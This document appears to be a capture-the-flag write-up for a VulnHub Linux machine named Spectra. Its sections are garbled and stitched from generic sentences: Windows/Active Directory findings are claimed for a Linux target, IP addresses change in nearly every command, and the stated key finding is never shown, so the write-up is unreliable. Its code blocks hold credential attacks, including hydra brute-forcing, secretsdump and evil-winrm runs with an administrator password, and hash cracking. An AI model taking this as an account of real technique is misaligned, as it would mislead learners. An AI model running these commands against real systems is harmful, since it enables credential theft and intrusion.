---
TitleSEO: "VulnHub — Spectra (Medium Linux) | ZureFX"
TitlePost: "VulnHub — Spectra (Medium Linux)"
Author: "ZureFX"
Description: "Full writeup for VulnHub Spectra. Subdomain Takeover and DNS Rebinding to achieve medium compromise on Linux."
Keywords: "hackthebox, tryhackme, forensics"
URL: "https://zurefx.github.io/writeups/htb-spectra-572.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-spectra-572/"
Date: "2025-03-21"
Tags: "HackTheBox, TryHackMe, Forensics"
Section: "writeups"
Lang: "en"
main_img: "htb-spectra-572"
Permalink: "/writeups/htb-spectra-572.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Spectra** is rated **Medium** on VulnHub. It runs **Linux** and the IP address during this analysis was `10.93.148.128`.

### Objectives

Lateral movement was facilitated by reusing discovered credentials across services. Unconstrained delegation was enabled on the compromised machine.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.30.81.155 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The backup files contained sensitive information that should not have been accessible. The target system was identified as running a vulnerable version of the service.

### Service Enumeration

Unconstrained delegation was enabled on the compromised machine. Privilege escalation was possible due to misconfigured sudo permissions. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
feroxbuster -h
evil-winrm -i 10.111.248.190 -u administrator -p 'P@ssw0rd!'
impacket-secretsdump administrator:'P@ssw0rd!'@10.120.123.215
gobuster dir -u http://10.35.170.138/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Network traffic analysis revealed unencrypted communications containing user credentials. Unconstrained delegation was enabled on the compromised machine.

### SMB Enumeration

The backup files contained sensitive information that should not have been accessible. The application stored sensitive credentials in an unencrypted configuration file.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.84.61.181/FUZZ
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.79.126.185 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Privilege escalation was possible due to misconfigured sudo permissions. Lateral movement was facilitated by reusing discovered credentials across services. Network traffic analysis revealed unencrypted communications containing user credentials.

## Exploitation

### Vulnerability Identification

Token impersonation allowed elevation to SYSTEM privileges on the target. The service was running without proper input validation, leading to injection vulnerabilities. Command injection was possible through unsanitized user input in the search functionality.

Key finding: **Subdomain Takeover**.

Command injection was possible through unsanitized user input in the search functionality. The service account had excessive permissions assigned in Active Directory.

### Initial Access

Post-exploitation enumeration revealed a path to domain administrator privileges. The target system was identified as running a vulnerable version of the service.

```bash
gobuster dir -u http://10.39.116.243/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.129.155.22/FUZZ
crackmapexec smb 10.11.85.111 -u administrator -p 'P@ssw0rd!' --shares
feroxbuster -h
```

The kernel version was outdated and vulnerable to a publicly known exploit. Authentication bypass was achieved through careful manipulation of the login mechanism. Initial enumeration revealed several interesting open ports on the target.

## Privilege Escalation

### Enumeration

The application stored sensitive credentials in an unencrypted configuration file. The database credentials were hardcoded in the application source code. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.36.142.123
impacket-secretsdump administrator:'P@ssw0rd!'@10.46.113.186
```

### Exploitation

Initial enumeration revealed several interesting open ports on the target. Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
nmap -sCV -p27017,3389,5986 10.115.190.223 -oN scan.txt
```

Unconstrained delegation was enabled on the compromised machine. The scheduled task ran with elevated privileges and could be abused for escalation.

### Root/SYSTEM

Successfully obtained **root** access on the target.

Group Policy Preferences contained encrypted but recoverable credentials. The kernel version was outdated and vulnerable to a publicly known exploit.

## Summary

### Tools Used

- `smbexec`
- `gobuster`
- `ligolo-ng`
- `crackmapexec`
- `lookupsid`

### Key Takeaways

- Subdomain Takeover
- DNS Rebinding
- SQL Injection
